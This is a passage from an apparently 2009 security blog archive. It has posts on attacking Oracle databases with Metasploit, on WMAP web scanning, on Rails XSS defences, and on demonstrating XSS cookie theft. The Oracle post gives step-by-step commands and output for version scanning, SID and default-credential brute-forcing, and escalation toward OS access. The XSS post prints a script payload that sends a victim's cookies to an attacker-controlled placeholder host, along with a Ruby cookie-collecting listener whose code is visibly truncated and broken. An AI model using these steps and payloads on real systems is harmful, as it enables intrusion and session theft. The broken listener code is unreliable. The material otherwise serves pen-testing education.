It's worth noting that some of these Oracle modules (there's 9 in the current Metasploit svn versions) have required privilege levels (dbms_cdc_publish for example in a vanilla 10GR2 setup needs EXECUTE_CATALOG_ROLE to run which only SYS and users with the DBA role have...), so it's worth trying out several to fit different scenarios...<br />
So here we are with DBA, which to be honest for a lot attackers is all that's needed.  The data in the database is likely to be the "crown jewels" which the attackers looking for, but hey we can go further with the wonders of Metasploit and execute code on the underlying operating system...</p>
<p><b>5. Leverage Oracles functionality to get access to the underlying operating system</b><br />
So at the moment I don't see a metasploit option for doing this in *nix (there's a win32 command execution module on <a href="http://www.metasploit.com/users/mc/oracle/win32exec.rb">mc's </a>page), however that's not a serious problem as it turns out the nice guys at Oracle provide ways to do this easily.</p>
<p>A quick google around revealed <a href="http://www.oracle.com/technology/tech/java/jsp/pdf/calling_shell_commands_from_plsql_1.1.pdf">this paper</a> from Oracle on command execution from a database user and from my running of it, it works fine (although requires creation of new database objects so best suited to an environment that can be rolled back easily...).<br />
So there you go, from nothing to OS access in 5 easy steps, courtesy of Metasploit...</p>

  <h2>
    <a href="/blog/2009/05/10/some_metasploit/">Some Metasploit and Oracle Notes - Part 1</a>
  </h2>

  <div>
    
    
    <p>Todays fun with Metasploit is exploiting Oracle...  There's lots of good information on this on the <a href="http://carnal0wnage.blogspot.com">Carnal 0wnage</a> blog and the metasploit page for <a href="http://metasploit.com/users/mc/">mc</a>.<br />
First things first, we'll need the relevant ruby modules (dbi and oci8) installed and working for some of this.<br />
dbi can be installed using the usual 'sudo gem install dbi' but oci8 has some more prerequisites and steps to get working.  The best thing to do is follow the instructions <a href="http://ruby-oci8.rubyforge.org/en/InstallForInstantClient.html">here </a>.  As a note you'll probably want to add the LD_LIBRARY_PATH to your bash profile to avoid setting it manually every time you want to use it (in Ubuntu this can be done system wide in /etc/bash.bashrc)<br />
Once you've done that it should be possible to make basic connections to oracle from ruby ok...<br />
So on to what Metasploit can do for you in a test with Oracle systems..  This walkthrough is heavily based on this video <a href="http://carnal0wnage.blogspot.com/2009/02/attacking-oracle-with-metasploit.html">here</a> from shmoocon this year.<br />
One set of rough steps for converting "hmm there's an oracle system here" to "w00t I've got admin access to the server" might be</p>
<ol>
<li>Discover the version of Oracle Running</li>
<li>Find out what the SID of the database is</li>
<li>Get valid credentials to the database</li>
<li>Escalate those credentials to DBA level access</li>
<li>Leverage Oracles functionality to get access to the underlying operating system</li>
<li>...</li>
<li>Profit!!</li>
</ol>
<p>Luckily Metasploit can help us with pretty much all of this....</p>
<p><b>1. Discover the version of Oracle running on the server</b><br />
This is very useful as it allows for targeting of exploits (no point in trying use an exploit for something that's been patched on the target).  </p>
<p>From msfconsole</p>
<pre>use auxiliary/scanner/oracle/tnslsnr_version </pre>
<pre>set RHOSTS [your_target_ip_here]
run </pre>
<p>from this you should see something like</p>
<pre>[*] Host 192.168.1.203 is running: Linux: Version 10.2.0.1.0 - Production
[*] Auxiliary module execution completed
</pre>
<p>which tells us we've got 10gR2 on Linux running.</p>
<p><b>2. Find out what the SID of the database is</b><br />
In order to connect to the database we're going to need to know what the SID is.  Pre 10GR2 we could just use the metasploit sid_enum module (in auxiliary/scanner/oracle) to find this but after that we'll need to brute-force it.  Not to worry there's a module for that too :)</p>
<p>As of 3.3-dev 6537 the sid_brute module doesn't appear to be included, but it can be downloaded from <a href="http://metasploit.com/users/mc/oracle/sid_brute.rb">mc's page</a>.  For this module you'll also need a list of common SIDs for Oracle.  One of those can be found on the<a href="http://www.red-database-security.com/scripts/sid.txt"> Red Database Security</a> site.<br />
so once you've put the sid_brute module in the right place (I used modules/auxiliary/scanner/oracle) and your sid.txt file somewhere (I used the default from the module of data/exploits) you can do the following...</p>
<pre> use auxiliary/scanner/oracle/sid_brute</pre>
<pre> set RHOST [your_target_ip_here]</pre>
<p>and hopefully you'll get some output like</p>
<pre>[*] Found SID 'ORCL' for host 192.168.1.203.</pre>
<p>So we've now got the SID of the database, on to usernames and passwords.</p>
<p><b>3. Get valid credentials to the database</b><br />
Now Oracle databases are pretty notorious for having a wide range of default usernames and passwords installed on them.  This isn't so true for modern releases but if your're running against older releases, it's well worth checking. </p>
<p>So to do this we'll need the brute_login metasploit module and a list of usernames and passwords.  The module again can be found on <a href="http://metasploit.com/users/mc/oracle/brute_login.rb">mc's page</a> and the canonical list of Oracle usernames and passwords is on <a href="http://www.petefinnigan.com/default/oracle_default_passwords.csv">Pete Finnigans</a> site.</p>
<p>Also we'll need to get the oracle mixin at this point from <a href="http://metasploit.com/users/mc/oracle/oracle.rb">here</a> and copy that to lib/msf/core/exploit/ .  Now at this point I was getting a module loading error but reading <a href="http://carnal0wnage.blogspot.com/2008/11/oracle-pwnage-with-metasploit-oracle.html">this</a> and <a href="http://carnal0wnage.blogspot.com/2008/08/metasploit-and-file-format-bugs.html">this</a> led me to the idea of modifying the brute_login.rb file adding</p>
<pre>require 'msf/core/exploit/oracle'</pre>
<p>to the top of the file (just under the other requires) to get it all loaded up ok (also found out that a lot of this ground's been covered before but hey :) ! )</p>
<p>So with those saved in appropriate places (same as last time) we can see what's there</p>
<pre>use auxiliary/scanner/oracle/brute_login </pre>
<pre> set RHOST [your_target_ip_here]
run</pre>
<p>Now wtih any luck you'll get a file called oracle_success.log popping up in the data/exploits directory which will contain some entries like this</p>
<pre>Found user/pass of: SCOTT/TIGER on 192.168.1.203...</pre>
<p>which tells us the creds we need to make a valid connection and move on to the next stage.<br />
So now we've got a valid account on the database, but it's not got that magic DBA level of privilege<br />
Next time I'll follow-up on using metasploit to get down the OS</p>

    <a href="/blog/2009/05/07/tonights_metasp/">Tonights Metasploit links</a>
  </h2>

  <div>
    
    
    <p>Been taking a look at another one of the newer Metasploit features tonight.  WMAP is looking to integrate web application scanning functionality into Metasploit.  There's a couple of good overviews <a href="http://trac.metasploit.com/browser/framework3/trunk/documentation/wmap.txt">Here</a>, <a href="http://www.vulnerabilityassessment.co.uk/wmap_meta.htm">Here</a>  and <a href="http://darkoperator.blogspot.com/2008/10/metasploit-wmap-web-attack-and.html">Here</a><br />
Getting it up and running is a little bit finicky at the moment, as you need to used a patched copy of <a href="http://code.google.com/p/ratproxy/">ratproxy</a> to collect the base URLs for the scanner (quick note is that my fairly new Ubuntu Intrepid install was missing libssl-dev which is a pre-requisite for compiling ratproxy so worth checking for if you get make errors when setting it up).<br />
Once you've gathered URLs and fed them in to the database getting the scanner to start running is straightforward (examples in the links at the top so I won't go into it).  From an initial look, some of the plugins seem to do some directory/file brute-forcing which can take ages to run, but if it's going on too long you can use CTRL-C to interrupt just that plug-in and Metasploit will catch the interrupt gracefully and move on to the next directory or plugin...</p>

    <a href="/blog/2009/03/31/rack_for_pen_te/">Rack for Pen Testing</a>
  </h2>

  <div>
    
    
    <p>One of the many things I got introduced to at Scotland on Rails was the <a href="http://rack.rubyforge.org/">Rack project</a>.  Designed to help create flexible web application deployments, it creates an interface between webservers and ruby web app. frameworks (rails, sinatra etc).<br />
Reading some of the examples, it occurred to me that Rack could be pretty handy for web application testing where sometimes it's useful to have a minimal web application to bounce things off.<br />
One example of this is demo'ing XSS attacks.  A standard XSS attack is cookie stealing.  The way this works is the attacker inserts a script tag with a reference to a URL controlled by the attacker and inserts the cookie for the victim site into a parameter to the URL.<br />
So for example if we've found an XSS vector we can put</p>
<pre>
&lt;script&gt;document.location=&quot;http://&lt;attacker_ip/cookiegrabber?cookie=&quot;+document.cookie&lt;/script&gt;
</pre>
<p>into the vulnerable box and if we have a server listening on that IP address we get the cookie..<br />
Here's where rack comes in.  You can use rack to very quickly create some code to listen on a port and accept the incoming request (and indeed to anything else you can do with ruby, but hey lets start small).<br />
A proof of concept script to do something like this might look like the one below...</p>
<pre>
#!/usr/bin/env ruby
require 'rubygems'
require 'rack'
builder = Rack::Builder.new do
use Rack::CommonLogger

end
map '/cookiegrabber' do
app = proc do |env|
req = Rack::Request.new(env)
ip = req.ip.to_s
cookie = req.params['cookie'] || &quot;No Cookie Parameter passed&quot;
@@grabbed &lt;&lt; [ip,cookie]
[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;grabbed &quot; + cookie + &quot; from &quot; + ip + &quot;&lt;br /&gt; Grabbed &quot; + @@grabbed.length.to_s + &quot; cookies so far&quot;]
end

end

end
else
out = &quot;Nothing Grabbed so far&quot;
end
[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, out]

    <p>It was the <a href="http://www.scotlandonrails.com">Scotland on Rails</a> 2009 conference on Friday/Saturday of last week.  A great couple of days with loads of interesting Ruby and Rails talks (I'm planning more of a recap once the videos are out)<br />
I presented on Web Application Security (slides <a href="http://www.slideshare.net/raesene/web-appliction-security-scotland-on-rails-presentation"> here</a>), which seemed to go down reasonably well.<br />
One of the main themes of my presentation was that, whilst Rails provides a variety of mechanisms to help developers to create secure applications, it still leaves a lot to the individual to think about, and relies on implementation of the protection that it provides.<br />
One major example of this it Rails default protection mechanism from XSS which is the h() function.  This HTML encodes the contents of the argument passed to it.  This is an effective defense against XSS but relies on developers to use it consistently, which can be tricky to remember.<br />
There's a couple of potential ways for improving this situation with plugins.<br />
The <a href="http://rubyforge.org/projects/safe-erb/">Safe ERB</a> plugin is designed to help developers by raising an exception when information pulled from an ActiveRecord model is displayed in a view without h() being used.<br />
The other way to approach the problem of XSS is to validate input when it's passed to the application.  There are a number of Rails plugins which take this approach including  <a href="http://code.google.com/p/sanitizeparams/">Sanitize Params</a> and <a href="http://code.google.com/p/xssterminate/">XSS Terminate</a></p>
